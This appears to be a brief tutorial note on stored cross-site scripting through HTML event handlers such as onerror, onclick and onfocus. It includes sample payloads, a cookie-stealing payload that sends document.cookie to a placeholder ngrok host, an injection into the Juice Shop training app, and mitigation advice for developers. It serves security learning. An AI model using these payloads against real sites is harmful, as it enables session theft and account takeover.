# Stored XSS via `Event Handlers` (`onmouseover`, `onclick`, `onfocus`)

They’re JavaScript actions that fire when something happens on the page, like:
- `onmouseover`	: When mouse hovers over an element
- `onclick`	: When a user clicks the element
- `onfocus`	When a form field is clicked/focused
- `onerror`	: When an image fails to load

> - HTML event handlers (like onclick) can execute JavaScript directly.
> - This technique works even when tags like <script> are blocked.

## Sample Payloads
**Inject into an input like Name or Comment**:
```js
<img src=x onerror="alert('XSS')">
```
Or interaction by clicking `click me`:
```js
<a href="x" onclick="alert('Hacked by Cybernerddd')">Click me</a>
```
```js
<input onfocus=alert(1) autofocus>
```
To steal cookies
```js
<img src=x onerror="fetch('https://your-ngrok.ngrok-server?c='+document.cookie)">
```

## Real case used
Juice Shop's search box allowed XSS via stored results.
```js
<a href="...">Click here</a>
```
So I injected
```js
<a href="#" onmouseover="alert('Juice Hacked')">Look me</a>
```

## Developers should:
> - Escape dangerous characters (<, >, ", ')
> - Sanitize input server-side before storing
> - Use Content Security Policy (CSP) to restrict script execution
